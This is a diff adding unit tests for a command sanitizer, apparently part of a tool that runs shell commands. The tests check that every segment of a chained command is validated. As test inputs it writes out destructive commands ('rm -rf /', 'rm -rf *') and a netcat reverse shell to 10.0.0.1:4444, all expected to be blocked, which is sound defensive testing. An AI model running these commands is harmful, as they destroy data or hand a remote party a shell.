@@ -96,6 +96,32 @@ class TestSanitizeCommand:
         is_safe, reason = _sanitize_command("cd code_projects/mi_app && python3 main.py")
         assert is_safe is True
 
+    def test_multi_command_segment_validation(self):
+        """Each segment in a chained command is independently validated."""
+        is_safe, reason = _sanitize_command("echo hello && rm -rf /")
+        assert is_safe is False
+        assert "segment" in reason.lower() or "rm" in reason.lower()
+
+    def test_multi_command_first_segment_blocks_second(self):
+        """A safe first segment doesn't mask a dangerous second segment."""
+        is_safe, reason = _sanitize_command("echo hello && sudo ls")
+        assert is_safe is False
+
+    def test_multi_command_pipe_segment_validation(self):
+        """Pipe chains validate each segment independently."""
+        is_safe, reason = _sanitize_command("cat file.txt | nc -e /bin/sh 10.0.0.1 4444")
+        assert is_safe is False
+
+    def test_multi_command_semicolon_validation(self):
+        """Semicolon-separated commands validate each segment."""
+        is_safe, reason = _sanitize_command("echo hello ; rm -rf *")
+        assert is_safe is False
+
+    def test_multi_command_all_safe_segments_pass(self):
+        """A multi-command with all safe segments should pass."""
+        is_safe, reason = _sanitize_command("echo hello && ls -la && pwd")
+        assert is_safe is True
+
 
 class TestForbiddenPatterns:
     def test_all_patterns_are_valid_regex(self):
